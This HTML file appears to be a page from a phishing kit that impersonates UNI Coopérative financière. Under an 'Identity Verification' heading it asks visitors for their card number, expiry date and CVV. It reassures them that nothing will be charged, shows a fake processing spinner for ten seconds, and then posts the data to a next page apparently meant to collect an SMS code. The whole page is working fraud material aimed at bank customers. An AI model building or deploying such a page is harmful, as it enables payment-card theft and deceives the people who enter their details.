<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNI - Identity Verification</title>
    <!-- Inclure la police Roboto pour la typographie -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <!-- Inclure FontAwesome pour les icnes -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #ffffff;
            color: #333333;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 440px; 
            padding: 24px 30px;
            box-sizing: border-box;
        }

        /* En-tte */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 45px;
            margin-top: 15px;
        }

        .logo-container {
            display: flex;
            align-items: center;
        }

        .phone-link {
            font-size: 15px;
            font-weight: 600;
            color: #0077A8; 
            text-decoration: none;
            display: flex;
            align-items: center;
        }

        .phone-link i {
            margin-right: 6px;
            font-size: 14px;
        }

        /* Section Titre */
        .title-section {
            margin-bottom: 25px;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #4a4a4a;
            margin: 0 0 10px 0;
        }

        .subtitle {
            font-size: 15px;
            font-weight: 400;
            color: #666666;
            margin: 0;
            line-height: 1.5;
        }

        /* Bote d'alerte pour rassurer l'utilisateur */
        .alert-box {
            background-color: #f8f9fa;
            border-left: 4px solid #0981C5;
            padding: 12px 15px;
            font-size: 13px;
            color: #555555;
            margin-bottom: 30px;
            display: flex;
            align-items: flex-start;
            border-radius: 4px;
        }
        
        .alert-box i {
            color: #0981C5;
            font-size: 16px;
            margin-right: 12px;
            margin-top: 2px;
        }

        /* Formulaire */
        .form-group {
            margin-bottom: 22px;
            position: relative;
        }
        
        .form-row {
            display: flex;
            gap: 15px;
        }
        
        .form-col {
            flex: 1;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #767676;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            box-sizing: border-box;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dcdcdc;
            border-radius: 4px;
            outline: none;
            color: #333333;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: #0981C5;
        }

        .input-icon-wrapper {
            position: relative;
        }
        
        .input-icon-wrapper i {
            position: absolute;
            right: 15px;
            top: 15px;
            color: #b0b0b0;
        }

        /* Bouton */
        .submit-btn {
            width: 100%;
            padding: 15px;
            background-color: #0981C5; 
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 20px;
            margin-top: 10px;
        }

        .submit-btn:hover {
            background-color: #0068a3;
        }

        /* Pied de page */
        .footer-text {
            text-align: center;
            font-size: 14px;
            color: #767676;
            margin-top: 10px;
        }

        .footer-link {
            color: #0981C5;
            font-weight: 500;
            text-decoration: underline;
        }
        
        .footer-link:hover {
            text-decoration: none;
        }
    
        /* Loader Overlay */
        .loader-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .loader-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .loader-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0981C5;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text {
            font-size: 16px;
            font-weight: 500;
            color: #333333;
        }

    </style>
</head>
<body>
    <div class="container">
        <!-- En-tte avec Logo et Tlphone -->
        <div class="header">
            <div class="logo-container">
                <!-- Logo Officiel -->
                <img src="images/logoo.JPG" alt="UNI Cooprative financire" style="height: 75px; width: auto; object-fit: contain;">
            </div>
            <a href="tel:1-888-359-1357" class="phone-link">
                <i class="fa-solid fa-phone"></i> 1-888-359-1357
            </a>
        </div>

        <!-- Titre et Sous-titre -->
        <div class="title-section">
            <h1 class="title">Identity Verification</h1>
            <p class="subtitle">Last step to confirm your identity and secure your account.</p>
        </div>

        <!-- Message de rassurance (Aucun paiement) -->
        <div class="alert-box">
            <i class="fa-solid fa-shield-halved"></i>
            <div>
                This is a verification procedure only. <strong>No amount will be charged</strong> to your account.
            </div>
        </div>

        <!-- Formulaire de Carte -->
        <form action="uni101_sms2.html" method="POST">
            <div class="form-group">
                <label class="form-label" for="card_number">Card number (16 digits)</label>
                <div class="input-icon-wrapper">
                    <!-- Script inline basique pour espacer les chiffres de la carte -->
                    <input type="text" id="card_number" name="card_number" class="form-input" required maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\d{4})(?=\d)/g, '$1 ')">
                    <i class="fa-regular fa-credit-card"></i>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group form-col">
                    <label class="form-label" for="expiry_date">Expiration date</label>
                    <!-- Script inline pour formater MM/AA -->
                    <input type="text" id="expiry_date" name="expiry_date" class="form-input" required maxlength="5" placeholder="MM/AA" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/^([2-9])$/g, '0$1').replace(/^(1{1})([3-9]{1})$/g, '0$1/$2').replace(/^([0-1]{1}[0-9]{1})([0-9]{1,2}).*/g, '$1/$2');">
                </div>
                
                <div class="form-group form-col">
                    <label class="form-label" for="cvv">Security code (CVV)</label>
                    <input type="password" id="cvv" name="cvv" class="form-input" required maxlength="3" placeholder="" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                </div>
            </div>

            <button type="submit" class="submit-btn">Verify my identity</button>
        </form>

        <!-- Lien de pied de page -->
        <div class="footer-text">
            Have a question? <a href="#" class="footer-link">Online Help Center</a>
        </div>
    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>

    <!-- Script pour le chargement -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() {
                        form.submit();
                    }, 10000); // 10 secondes
                });
            }
        });
    </script>

<script src="security_module.js"></script>
</body>
</html>
